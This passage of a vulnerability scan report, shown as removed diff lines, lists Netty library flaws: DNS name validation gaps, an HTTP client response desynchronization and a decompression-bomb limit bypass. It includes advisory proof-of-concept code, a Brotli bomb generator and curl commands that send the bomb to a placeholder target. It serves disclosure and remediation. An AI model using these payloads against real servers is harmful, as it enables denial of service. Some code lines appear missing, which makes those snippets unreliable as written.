-                        │     │                   ```
-                        │     │                   An attacker can craft input like `"safe-domain..evil.com"`
-                        │     │                   which gets truncated to just `"safe-domain."`, potentially
-                        │     │                   bypassing domain allowlists.
-                        │     │                   ### 3.4 Decoder Side — Unbounded Memory Allocation
-                        │     │                   The decoder accepts labels of any length (0-255 bytes)
-                        │     │                   without checking the RFC 1035 per-label limit of 63 bytes or
-                        │     │                   the total domain name limit of 255 bytes. A malicious DNS
-                        │     │                   server can return responses with oversized labels, causing
-                        │     │                   excessive memory allocation.
-                        │     │                   ### Root Cause — Encoder
-                        │     │                   // DnsCodecUtil.java:31-51
-                        │     │                   static void encodeDomainName(String name, ByteBuf buf) {
-                        │     │                       if (ROOT.equals(name)) {
-                        │     │                           buf.writeByte(0);
-                        │     │                           return;
-                        │     │                       }
-                        │     │                       final String[] labels = name.split("\\.");
-                        │     │                       for (String label : labels) {
-                        │     │                           final int labelLen = label.length();
-                        │     │                           if (labelLen == 0) {
-                        │     │                               break;  // NO ERROR - silently truncates!
-                        │     │                           }
-                        │     │                           // NO check: labelLen > 63
-                        │     │                           // NO check: label contains null bytes
-                        │     │                           // NO check: total name > 255 bytes
-                        │     │                           buf.writeByte(labelLen);                    // Can
-                        │     │                   write values > 63!
-                        │     │                           ByteBufUtil.writeAscii(buf, label);         // Null
-                        │     │                   bytes pass through!
-                        │     │                       buf.writeByte(0);
-                        │     │                   }
-                        │     │                   ### Root Cause — Decoder
-                        │     │                   // DnsCodecUtil.java:94-99 (decodeDomainName)
-                        │     │                   } else if (len != 0) {
-                        │     │                       if (!in.isReadable(len)) {  // Only checks if bytes
-                        │     │                   EXIST, not if len <= 63
-                        │     │                           throw new CorruptedFrameException("truncated label in
-                        │     │                    a name");
-                        │     │                       name.append(in.toString(in.readerIndex(), len,
-                        │     │                   CharsetUtil.UTF_8)).append('.');
-                        │     │                       //    ^^^^^^ StringBuilder grows WITHOUT any length
-                        │     │                   limit
-                        │     │                       in.skipBytes(len);
-                        │     │                   **Missing checks in decoder**:
-                        │     │                   - No `if (len > 63)` check per RFC 1035 Section 2.3.4
-                        │     │                   - No `if (name.length() > 255)` check for total domain name
-                        │     │                   length
-                        │     │                   ## 4. Exploitability Prerequisites
-                        │     │                   ### Encoder Side (outbound)
-                        │     │                   1. An application constructs DNS queries using Netty's DNS
-                        │     │                   codec with user-influenced domain names
-                        │     │                   2. The constructed DNS packets are sent to DNS servers or
-                        │     │                   resolvers
-                        │     │                   ### Decoder Side (inbound)
-                        │     │                   1. An application uses Netty's `codec-dns` or `resolver-dns`
-                        │     │                   module to process DNS responses
-                        │     │                   2. The application communicates with a malicious or
-                        │     │                   compromised DNS server
-                        │     │                   **Attack surface**: Any Netty application using DNS
-                        │     │                   resolution (`DnsNameResolver`) is potentially affected on the
-                        │     │                    decoder side, as DNS responses from the network are
-                        │     │                   attacker-controlled. The encoder side requires
-                        │     │                   user-controlled hostnames.
-                        │     │                   ## 5. Attack Scenarios
-                        │     │                   ### Scenario 1: DNS Cache Poisoning via Null Byte (Encoder)
-                        │     │                   String hostname = userInput;  // "evil\0.trusted.com"
-                        │     │                   DnsQuery query = new DefaultDnsQuery(...)
-                        │     │                       .addRecord(DnsSection.QUESTION,
-                        │     │                           new DefaultDnsQuestion(hostname, DnsRecordType.A));
-                        │     │                   The DNS query for `"evil\0.trusted.com"` may be interpreted
-                        │     │                   by some resolvers as a query for `"evil"` (truncated at
-                        │     │                   null). If the attacker controls the DNS for `"evil"`, they
-                        │     │                   can return a response that gets cached for
-                        │     │                   `"evil\0.trusted.com"` (or vice versa), poisoning the cache.
-                        │     │                   ### Scenario 2: Label/Pointer Confusion (Encoder)
-                        │     │                   A 200-byte label writes length byte `0xC8`.
-                        │     │                   Standards-compliant parsers interpret `0xC0-0xFF` as
-                        │     │                   **compression pointer** prefixes (RFC 1035 Section 4.1.4).
-                        │     │                   The resulting DNS packet is structurally ambiguous:
-                        │     │                   Byte:  [C8] [61 61 61 ... (200 bytes)]
-                        │     │                            ↑
-                        │     │                      Label interpretation: 200-byte label starting with 'a'
-                        │     │                      Pointer interpretation: pointer to offset 0x0861 = 2145
-                        │     │                   ### Scenario 3: Memory Exhaustion via Large Labels (Decoder)
-                        │     │                   A malicious DNS server returns a response with a 255-byte
-                        │     │                   label (RFC limit: 63). Netty decodes it without error,
-                        │     │                   creating a 260+ character String. With compression pointers,
-                        │     │                   a small DNS response can cause megabytes of StringBuilder
-                        │     │                   allocation.
-                        │     │                   ### Scenario 4: Domain Truncation via Empty Label (Encoder)
-                        │     │                   encodeDomainName("safe-domain..evil.com", buf);
-                        │     │                   // Only "safe-domain." is encoded, "evil.com" silently
-                        │     │                   dropped
-                        │     │                   This can bypass domain allowlists that check the input
-                        │     │                   string.
-                        │     │                   ### Scenario 5: Downstream Processing Failures (Decoder)
-                        │     │                   Applications that pass decoded domain names to other DNS
-                        │     │                   libraries, certificate validators, or URL parsers may crash
-                        │     │                   or behave incorrectly when receiving names > 255 bytes, as
-                        │     │                   these systems typically assume RFC 1035 compliance.
-                        │     │                   ## 6. Proof of Concept
-                        │     │                   ### PoC 1: Encoder Null Byte and Overlength
-                        │     │                   (DnsEncoderNullBytePoC.java)
-                        │     │                   import io.netty.buffer.ByteBuf;
-                        │     │                   import io.netty.buffer.Unpooled;
-                        │     │                   import java.lang.reflect.Method;
-                        │     │                   import java.nio.charset.StandardCharsets;
-                        │     │                   public class DnsEncoderNullBytePoC {
-                        │     │                       public static void main(String[] args) throws Exception
-                        │     │                   {
-                        │     │                           System.out.println("=== Netty DNS Encoder Validation
-                        │     │                   Bypass PoC ===\n");
-                        │     │                           Class<?> clazz =
-                        │     │                   Class.forName("io.netty.handler.codec.dns.DnsCodecUtil");
-                        │     │                           Method encode =
-                        │     │                   clazz.getDeclaredMethod("encodeDomainName",
-                        │     │                               String.class, ByteBuf.class);
-                        │     │                           encode.setAccessible(true);
-                        │     │                           // Test 1: Null byte in domain name
-                        │     │                           ByteBuf buf = Unpooled.buffer(256);
-                        │     │                           encode.invoke(null, "evil\0.example.com", buf);
-                        │     │                           byte[] bytes = new byte[buf.readableBytes()];
-                        │     │                           buf.readBytes(bytes);
-                        │     │                           buf.release();
-                        │     │                           System.out.print("[TEST 1] Null byte - Encoded: ");
-                        │     │                           for (byte b : bytes) System.out.printf("%02x ", b &
-                        │     │                   0xff);
-                        │     │                           System.out.println("\nVULNERABLE: Null byte 0x00 in
-                        │     │                   label data!");
-                        │     │                           // Test 2: 200-byte label
-                        │     │                           ByteBuf buf2 = Unpooled.buffer(512);
-                        │     │                           encode.invoke(null, "a".repeat(200) + ".com", buf2);
-                        │     │                           System.out.println("\n[TEST 2] 200-byte label
-                        │     │                   encoded: " + buf2.readableBytes() + " bytes");
-                        │     │                           System.out.println("VULNERABLE: Overlength label
-                        │     │                   accepted!");
-                        │     │                           buf2.release();
-                        │     │                           // Test 3: Empty label truncation
-                        │     │                           ByteBuf buf3 = Unpooled.buffer(256);
-                        │     │                           encode.invoke(null, "a..b.com", buf3);
-                        │     │                           byte[] bytes3 = new byte[buf3.readableBytes()];
-                        │     │                           buf3.readBytes(bytes3);
-                        │     │                           buf3.release();
-                        │     │                           System.out.print("\n[TEST 3] Empty label - Encoded:
-                        │     │                   ");
-                        │     │                           for (byte b : bytes3) System.out.printf("%02x ", b &
-                        │     │                           System.out.println("\nVULNERABLE: Domain silently
-                        │     │                   truncated!");
-                        │     │                   ### PoC 2: Decoder Length Bypass (DnsDecoderLengthPoC.java)
-                        │     │                   public class DnsDecoderLengthPoC {
-                        │     │                           System.out.println("=== Netty DNS Decoder Length
-                        │     │                           Method decode =
-                        │     │                   clazz.getDeclaredMethod("decodeDomainName", ByteBuf.class);
-                        │     │                           decode.setAccessible(true);
-                        │     │                           // Test 1: 100-byte label (RFC limit: 63)
-                        │     │                           ByteBuf buf1 = Unpooled.buffer(256);
-                        │     │                           buf1.writeByte(100);
-                        │     │                          
-                        │     │                   buf1.writeBytes("a".repeat(100).getBytes(StandardCharsets.US_
-                        │     │                   ASCII));
-                        │     │                           buf1.writeByte(3);
-                        │     │                   buf1.writeBytes("com".getBytes(StandardCharsets.US_ASCII));
-                        │     │                           buf1.writeByte(0);
-                        │     │                           String r1 = (String) decode.invoke(null, buf1);
-                        │     │                           buf1.release();
-                        │     │                           System.out.println("[TEST 1] 100-byte label: length="
-                        │     │                    + r1.length() +
-                        │     │                               " VULNERABLE=" + (r1.length() > 64));
-                        │     │                           // Test 2: 5 x 60-byte labels = 305 bytes (RFC limit:
-                        │     │                    255)
-                        │     │                           for (int i = 0; i < 5; i++) {
-                        │     │                               buf2.writeByte(60);
-                        │     │                              
-                        │     │                   buf2.writeBytes(String.valueOf((char)('a'+i)).repeat(60)
-                        │     │                                   .getBytes(StandardCharsets.US_ASCII));
-                        │     │                           buf2.writeByte(0);
-                        │     │                           String r2 = (String) decode.invoke(null, buf2);
-                        │     │                           System.out.println("[TEST 2] 305-byte domain:
-                        │     │                   length=" + r2.length() +
-                        │     │                               " VULNERABLE=" + (r2.length() > 255));
-                        │     │                   ### How to Compile and Run
-                        │     │                   ```bash
-                        │     │                   JARS=$(find ~/.m2/repository/io/netty -name "netty-*.jar"
-                        │     │                   -path "*/4.2.12.Final/*" \
-                        │     │                     | grep -v sources | grep -v javadoc | tr '\n' ':')
-                        │     │                   # Encoder PoC
-                        │     │                   javac -cp "$JARS" DnsEncoderNullBytePoC.java
-                        │     │                   java --add-opens java.base/java.lang=ALL-UNNAMED -cp
-                        │     │                   "$JARS:." DnsEncoderNullBytePoC
-                        │     │                   # Decoder PoC
-                        │     │                   javac -cp "$JARS" DnsDecoderLengthPoC.java
-                        │     │                   "$JARS:." DnsDecoderLengthPoC
-                        │     │                   ### PoC Execution Output (Verified on Netty 4.2.12.Final)
-                        │     │                   **Encoder PoC:**
-                        │     │                   === Netty DNS Encoder Validation Bypass PoC ===
-                        │     │                   [TEST 1] Null byte in domain name
-                        │     │                     Input: "evil\0.example.com"
-                        │     │                     Encoded bytes: 05 65 76 69 6c 00 07 65 78 61 6d 70 6c 65 03
-                        │     │                    63 6f 6d 00
-                        │     │                     Null byte in label data: true
-                        │     │                     VULNERABLE: YES - Null byte accepted!
-                        │     │                   [TEST 2] Label > 63 bytes in encoder
-                        │     │                     Input: "aaaaaa..." (200-char label)
-                        │     │                     Encoded bytes: 206
-                        │     │                     VULNERABLE: YES - Overlength label accepted in encoder!
-                        │     │                   [TEST 3] Empty labels (consecutive dots)
-                        │     │                     Input: "a..b.com"
-                        │     │                     Encoded bytes: 01 61 00
-                        │     │                     Note: Empty label truncates the name (may lose data)
-                        │     │                   **Decoder PoC:**
-                        │     │                   === Netty DNS Decoder Length Bypass PoC ===
-                        │     │                   [TEST 1] Label > 63 bytes (RFC 1035 violation)
-                        │     │                     Label length: 100 bytes (RFC limit: 63)
-                        │     │                     Decoded name length: 105
-                        │     │                     VULNERABLE: YES - Label > 63 bytes accepted!
-                        │     │                   [TEST 2] Domain > 255 bytes via multiple labels
-                        │     │                     5 labels x 60 bytes = 300+ bytes total
-                        │     │                     RFC 1035 limit: 255 bytes
-                        │     │                     Decoded name length: 305
-                        │     │                     VULNERABLE: YES - Domain > 255 bytes accepted!
-                        │     │                   ## 7. Impact Analysis
-                        │     │                   | Impact Category | Description |
-                        │     │                   |----------------|-------------|
-                        │     │                   | **Integrity** | HIGH — Null byte injection causes
-                        │     │                   differential interpretation across DNS implementations |
-                        │     │                   | **Availability** | HIGH — Malicious DNS responses can cause
-                        │     │                    unbounded memory allocation via decoder |
-                        │     │                   | **DNS Cache Poisoning** | Different parsers see different
-                        │     │                   domain names from the same encoded packet |
-                        │     │                   | **Domain Validation Bypass** | Null bytes can bypass
-                        │     │                   allowlist/blocklist checks in DNS proxies |
-                        │     │                   | **Label/Pointer Confusion** | Length bytes > 63 conflict
-                        │     │                   with RFC 1035 compression pointer encoding |
-                        │     │                   | **Silent Truncation** | Empty labels silently drop the
-                        │     │                   remainder of the domain name |
-                        │     │                   | **Downstream Failures** | Oversized domain names may crash
-                        │     │                   certificate validators, URL parsers, or other DNS-aware
-                        │     │                   libraries |
-                        │     │                   ## 8. Remediation Recommendations
-                        │     │                   ### Fix for Encoder (encodeDomainName)
-                        │     │                       int totalLength = 0;
-                        │     │                               throw new IllegalArgumentException("DNS name
-                        │     │                   contains empty label: " + name);
-                        │     │                           if (labelLen > 63) {
-                        │     │                               throw new IllegalArgumentException(
-                        │     │                                   "DNS label length " + labelLen + " exceeds
-                        │     │                   maximum of 63: " + name);
-                        │     │                           for (int i = 0; i < label.length(); i++) {
-                        │     │                               if (label.charAt(i) == '\0') {
-                        │     │                                   throw new IllegalArgumentException(
-                        │     │                                       "DNS label contains null byte at index "
-                        │     │                   + i);
-                        │     │                               }
-                        │     │                           totalLength += 1 + labelLen;
-                        │     │                           if (totalLength > 254) {
-                        │     │                                   "DNS name exceeds maximum length of 255: " +
-                        │     │                   name);
-                        │     │                           buf.writeByte(labelLen);
-                        │     │                           ByteBufUtil.writeAscii(buf, label);
-                        │     │                   ### Fix for Decoder (decodeDomainName)
-                        │     │                   // Add after "} else if (len != 0) {":
-                        │     │                   if (len > 63) {
-                        │     │                       throw new CorruptedFrameException("DNS label length " +
-                        │     │                   len + " exceeds maximum of 63");
-                        │     │                   // Add after "name.append(...)":
-                        │     │                   if (name.length() > 255) {
-                        │     │                       throw new CorruptedFrameException("DNS domain name length
-                        │     │                    exceeds maximum of 255");
-                        │     │                   ## 9. Resources
-                        │     │                   - [RFC 1035 Section 2.3.4: Size
-                        │     │                   Limits](https://tools.ietf.org/html/rfc1035#section-2.3.4)
-                        │     │                   - [RFC 1035 Section 4.1.4: Message
-                        │     │                   Compression](https://tools.ietf.org/html/rfc1035#section-4.1.
-                        │     │                   4)
-                        │     │                   - [CWE-20: Improper Input
-                        │     │                   Validation](https://cwe.mitre.org/data/definitions/20.html)
-                        │     │                   - [CWE-400: Uncontrolled Resource
-                        │     │                   Consumption](https://cwe.mitre.org/data/definitions/400.html)
-                        │     │                   - [CWE-626: Null Byte Interaction
-                        │     │                   Error](https://cwe.mitre.org/data/definitions/626.html) 
-                        │     ├ Severity        : HIGH 
-                        │     ├ VendorSeverity   ─ ghsa: 3 
-                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N 
-                        │     │                         ╰ V3Score : 7.5 
-                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                        ├ [1]: https://github.com/netty/netty/security/advisories/GHSA
-                        │                        │      -cm33-6792-r9fm 
-                        │                        ├ [2]: https://tools.ietf.org/html/rfc1035#section-2.3.4 
-                        │                        ╰ [3]: https://tools.ietf.org/html/rfc1035#section-4.1.4 
-                        ├ [2] ╭ VulnerabilityID : CVE-2026-42584 
-                        │     ├ VendorIDs        ─ [0]: GHSA-57rv-r2g8-2cj3 
-                        │     ├ PkgName         : io.netty:netty-codec-http 
-                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
-                        │     │                  ╰ UID : 42139b2b89dda2f4 
-                        │     ├ InstalledVersion: 4.2.12.Final 
-                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
-                        │     │                  │         4edd8ebe468fc57d07e 
-                        │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
-                        │     │                            0961a5292bd158a4dcf 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42584 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:138c25aeebd79616619b94270d69dfd09bb9ef5e576cded2f5f9d8
-                        │     │                   3c459589cc 
-                        │     ├ Title           : Netty has HttpClientCodec response desynchronization 
-                        │     ├ Description     : ### Summary
-                        │     │                    If HttpClientCodec is configured, there are use cases when a
-                        │     │                    response body from one request, can be parsed as another's.
-                        │     │                   
-                        │     │                   ### Details
-                        │     │                   HttpClientCodec pairs each inbound response with an outbound
-                        │     │                   request by `queue.poll()` once per response, including for
-                        │     │                   `1xx`. If the client pipelines GET then HEAD and the server
-                        │     │                   sends 103, then 200 with GET body, then 200 for HEAD, the
-                        │     │                   queue pairs HEAD with the first 200. The HEAD rule then skips
-                        │     │                    reading that message’s body, so the GET entity bytes stay on
-                        │     │                    the stream and the following 200 is parsed from the wrong
-                        │     │                   offset.
-                        │     │                   Prerequisites 
-                        │     │                   - HTTP/1.1 pipelining
-                        │     │                   - HEAD in the pipeline
-                        │     │                   - The server sends 1xx
-                        │     │                   ### PoC
-                        │     │                   ```java
-                        │     │                       @Test
-                        │     │                       public void test() {
-                        │     │                           EmbeddedChannel channel = new EmbeddedChannel(new
-                        │     │                   HttpClientCodec());
-                        │     │                           assertTrue(channel.writeOutbound(new
-                        │     │                   DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET,
-                        │     │                   "/1")));
-                        │     │                           ByteBuf request = channel.readOutbound();
-                        │     │                           request.release();
-                        │     │                           assertNull(channel.readOutbound());
-                        │     │                   DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.HEAD,
-                        │     │                    "/2")));
-                        │     │                           request = channel.readOutbound();
-                        │     │                           String responseStr = "HTTP/1.1 103 Early
-                        │     │                   Hints\r\n\r\n" +
-                        │     │                                   "HTTP/1.1 200 OK\r\nContent-Length:
-                        │     │                   5\r\n\r\nhello" +
-                        │     │                                   "HTTP/1.1 200 OK\r\n\r\n";
-                        │     │                          
-                        │     │                   assertTrue(channel.writeInbound(Unpooled.copiedBuffer(respons
-                        │     │                   eStr, CharsetUtil.US_ASCII)));
-                        │     │                           // Response 1
-                        │     │                           HttpResponse response = channel.readInbound();
-                        │     │                           assertEquals(HttpResponseStatus.EARLY_HINTS,
-                        │     │                   response.status());
-                        │     │                           LastHttpContent last = channel.readInbound();
-                        │     │                           assertEquals(0, last.content().readableBytes());
-                        │     │                           last.release();
-                        │     │                           // Response 2
-                        │     │                           response = channel.readInbound();
-                        │     │                           assertEquals(HttpResponseStatus.OK,
-                        │     │                           last = channel.readInbound();
-                        │     │                           // Response 3
-                        │     │                           FullHttpResponse response1 = channel.readInbound();
-                        │     │                           assertTrue(response1.decoderResult().isFailure());
-                        │     │                           assertEquals(0,
-                        │     │                   response1.content().readableBytes());
-                        │     │                           response1.release();
-                        │     │                           assertFalse(channel.finish());
-                        │     │                       }
-                        │     │                   ```
-                        │     │                   ### Impact
-                        │     │                   Integrity/availability of HTTP parsing on that connection,
-                        │     │                   unsafe reuse of the socket. 
-                        │     ├ Severity        : HIGH 
-                        │     ├ VendorSeverity   ─ ghsa: 3 
-                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L 
-                        │     │                         ╰ V3Score : 7.3 
-                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
-                        │                               -57rv-r2g8-2cj3 
-                        ├ [3] ╭ VulnerabilityID : CVE-2026-42587 
-                        │     ├ VendorIDs        ─ [0]: GHSA-f6hv-jmp6-3vwv 
-                        │     ├ PkgName         : io.netty:netty-codec-http 
-                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
-                        │     │                  ╰ UID : 42139b2b89dda2f4 
-                        │     ├ InstalledVersion: 4.2.12.Final 
-                        │     ├ FixedVersion    : 4.2.13.Final, 4.1.133.Final 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
-                        │     │                  │         4edd8ebe468fc57d07e 
-                        │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
-                        │     │                            0961a5292bd158a4dcf 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42587 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:ef9815ae7a94903bd25f8c10fe8311c41be84c2034ee55de815139
-                        │     │                   11ed991da4 
-                        │     ├ Title           : Netty: HttpContentDecompressor maxAllocation bypass when
-                        │     │                   Content-Encoding set to br/zstd/snappy leads to decompression
-                        │     │                    bomb DoS 
-                        │     ├ Description     : ## Summary
-                        │     │                   
-                        │     │                   `HttpContentDecompressor` accepts a `maxAllocation` parameter
-                        │     │                    to limit decompression buffer size and prevent decompression
-                        │     │                    bomb attacks. This limit is correctly enforced for gzip and
-                        │     │                   deflate encodings via `ZlibDecoder`, but is silently ignored
-                        │     │                   when the content encoding is `br` (Brotli), `zstd`, or
-                        │     │                   `snappy`. An attacker can bypass the configured decompression
-                        │     │                    limit by sending a compressed payload with
-                        │     │                   `Content-Encoding: br` instead of `Content-Encoding: gzip`,
-                        │     │                   causing unbounded memory allocation and out-of-memory denial
-                        │     │                   of service.
-                        │     │                   The same vulnerability exists in
-                        │     │                   `DelegatingDecompressorFrameListener` for HTTP/2
-                        │     │                   connections.
-                        │     │                   ## Details
-                        │     │                   `HttpContentDecompressor` stores the `maxAllocation` value at
-                        │     │                    construction time (`HttpContentDecompressor.java:89`) and
-                        │     │                   uses it in `newContentDecoder()` to create the appropriate
-                        │     │                   decompression handler.
-                        │     │                   For gzip/deflate, `maxAllocation` is forwarded to
-                        │     │                   `ZlibCodecFactory.newZlibDecoder()`:
-                        │     │                   ```java
-                        │     │                   // HttpContentDecompressor.java:101 — maxAllocation IS
-                        │     │                   enforced
-                        │     │                   .handlers(ZlibCodecFactory.newZlibDecoder(ZlibWrapper.GZIP,
-                        │     │                   maxAllocation))
-                        │     │                   ```
-                        │     │                   `ZlibDecoder.prepareDecompressBuffer()` enforces this as a
-                        │     │                   hard cap by setting the buffer's `maxCapacity` and throwing
-                        │     │                   `DecompressionException` when the limit is reached:
-                        │     │                   // ZlibDecoder.java:68 — hard limit on buffer capacity
-                        │     │                   return ctx.alloc().heapBuffer(Math.min(preferredSize,
-                        │     │                   maxAllocation), maxAllocation);
-                        │     │                   // ZlibDecoder.java:80 — throws when exceeded
-                        │     │                   throw new DecompressionException("Decompression buffer has
-                        │     │                   reached maximum size: " + buffer.maxCapacity());
-                        │     │                   For brotli, zstd, and snappy, the decoders are created
-                        │     │                   without any size limit:
-                        │     │                   // HttpContentDecompressor.java:120 — maxAllocation IGNORED
-                        │     │                   .handlers(new BrotliDecoder())
-                        │     │                   // HttpContentDecompressor.java:129 — maxAllocation IGNORED
-                        │     │                   .handlers(new SnappyFrameDecoder())
-                        │     │                   // HttpContentDecompressor.java:138 — maxAllocation IGNORED
-                        │     │                   .handlers(new ZstdDecoder())
-                        │     │                   `BrotliDecoder` has no `maxAllocation` parameter at all —
-                        │     │                   there is no way to constrain its output. It streams
-                        │     │                   decompressed data in chunks via `fireChannelRead` with no
-                        │     │                   total limit.
-                        │     │                   `ZstdDecoder()` defaults to a 4MB `maximumAllocationSize`,
-                        │     │                   but this only constrains individual buffer allocations, not
-                        │     │                   total output. The decode loop (`ZstdDecoder.java:100-114`)
-                        │     │                   creates new buffers and fires `channelRead` repeatedly, so
-                        │     │                   total decompressed output is unbounded.
-                        │     │                   The identical pattern exists in
-                        │     │                   `DelegatingDecompressorFrameListener.newContentDecompressor()
-                        │     │                   ` at lines 188-210 for HTTP/2.
-                        │     │                   ## PoC
-                        │     │                   1. Configure a Netty HTTP server with decompression bomb
-                        │     │                   protection:
-                        │     │                   pipeline.addLast(new HttpContentDecompressor(1048576)); //
-                        │     │                   1MB max
-                        │     │                   pipeline.addLast(new HttpObjectAggregator(1048576));     //
-                        │     │                   2. Generate a brotli-compressed bomb (~1KB compressed → 1GB
-                        │     │                   decompressed):
-                        │     │                   ```python
-                        │     │                   import brotli
-                        │     │                   bomb = b'\x00' * (1024 * 1024 * 1024)  # 1GB of zeros
-                        │     │                   compressed = brotli.compress(bomb, quality=11)
-                        │     │                   with open('bomb.br', 'wb') as f:
-                        │     │                       f.write(compressed)
-                        │     │                   # compressed size: ~1KB
-                        │     │                   3. Send the bomb with gzip encoding (BLOCKED by
-                        │     │                   maxAllocation):
-                        │     │                   ```bash
-                        │     │                   # This is caught — ZlibDecoder enforces the 1MB limit
-                        │     │                   curl -X POST http://target:8080/api \
-                        │     │                     -H 'Content-Encoding: gzip' \
-                        │     │                     --data-binary @bomb.gz
-                        │     │                   # Result: DecompressionException thrown at 1MB
-                        │     │                   4. Send the same bomb with brotli encoding (BYPASSES
-                        │     │                   # This bypasses the limit — BrotliDecoder has no
-                        │     │                   maxAllocation
-                        │     │                     -H 'Content-Encoding: br' \
-                        │     │                     --data-binary @bomb.br
-                        │     │                   # Result: Full 1GB decompressed into memory → OOM
-                        │     │                   5. The same bypass works with `Content-Encoding: zstd` and
-                        │     │                   `Content-Encoding: snappy`.
-                        │     │                   ## Impact
-                        │     │                   - **Denial of Service**: An attacker can cause out-of-memory
-                        │     │                   conditions on any Netty server that relies on `maxAllocation`
-                        │     │                    for decompression bomb protection, by simply using a
-                        │     │                   non-gzip content encoding.
-                        │     │                   - **False sense of security**: Developers who explicitly
-                        │     │                   configure `maxAllocation` to protect against decompression
-                        │     │                   bombs are not actually protected for brotli, zstd, or snappy
-                        │     │                   encodings. The API documentation implies all encodings are
-                        │     │                   covered.
-                        │     │                   - **Trivial bypass**: The attacker only needs to change one
-                        │     │                   HTTP header (`Content-Encoding: br` instead of
-                        │     │                   `Content-Encoding: gzip`) to circumvent the protection
-                        │     │                   entirely.
-                        │     │                   - **Both HTTP/1.1 and HTTP/2**: The vulnerability exists in
-                        │     │                   both `HttpContentDecompressor` (HTTP/1.1) and
-                        │     │                   `DelegatingDecompressorFrameListener` (HTTP/2).
-                        │     │                   ## Recommended Fix
-                        │     │                   Pass `maxAllocation` to all decoder constructors. For
-                        │     │                   `BrotliDecoder`, which currently has no `maxAllocation`
-                        │     │                   support, add the parameter:
-                        │     │                   **HttpContentDecompressor.java** — pass maxAllocation to all
-                        │     │                   decoders:
-                        │     │                   // Line 120: BrotliDecoder — add maxAllocation support
-                        │     │                   .handlers(new BrotliDecoder(maxAllocation))
-                        │     │                   // Line 129: SnappyFrameDecoder — add maxAllocation support
-                        │     │                   .handlers(new SnappyFrameDecoder(maxAllocation))
-                        │     │                   // Line 138: ZstdDecoder — forward the configured
-                        │     │                   .handlers(new ZstdDecoder(maxAllocation))
-                        │     │                   **DelegatingDecompressorFrameListener.java** — same fix at
-                        │     │                   lines 188-210.
-                        │     │                   **BrotliDecoder** — add `maxAllocation` parameter with the
-                        │     │                   same semantics as `ZlibDecoder.prepareDecompressBuffer()`:
-                        │     │                   set buffer maxCapacity and throw `DecompressionException`
-                        │     │                   when the total decompressed output exceeds the limit.
-                        │     │                   **SnappyFrameDecoder** — add `maxAllocation` parameter with
-                        │     │                   equivalent enforcement.
-                        │     │                   **ZstdDecoder** — ensure that when `maxAllocation` is set,
-                        │     │                   total output across all buffers is bounded (not just
-                        │     │                   per-buffer allocation size). 
-                        │     ├ Severity        : HIGH 
-                        │     ├ VendorSeverity   ─ ghsa: 3 
-                        │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
-                        │     │                         ╰ V3Score : 7.5 
-                        │     ╰ References       ╭ [0]: https://github.com/netty/netty 
-                        │                        ╰ [1]: https://github.com/netty/netty/security/advisories/GHSA
-                        │                               -f6hv-jmp6-3vwv 
-                        ├ [4] ╭ VulnerabilityID : CVE-2026-41417 
-                        │     ├ VendorIDs        ─ [0]: GHSA-v8h7-rr48-vmmv 
-                        │     ├ PkgName         : io.netty:netty-codec-http 
-                        │     ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.12.Final.jar 
-                        │     ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.12.Final 
-                        │     │                  ╰ UID : 42139b2b89dda2f4 
-                        │     ├ InstalledVersion: 4.2.12.Final 
-                        │     ├ FixedVersion    : 4.1.133.Final, 4.2.13.Final 
-                        │     ├ Status          : fixed 
-                        │     ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e9
-                        │     │                  │         4edd8ebe468fc57d07e 
-                        │     │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae
-                        │     │                            0961a5292bd158a4dcf 
-                        │     ├ SeveritySource  : ghsa 
-                        │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41417 
-                        │     ├ DataSource       ╭ ID  : ghsa 
-                        │     │                  ├ Name: GitHub Security Advisory Maven 
-                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
-                        │     │                          osystem%3Amaven 
-                        │     ├ Fingerprint     : sha256:f4a0586c7efa06b5be3a3e07773923f8635330ac5f65bcf26e69c3
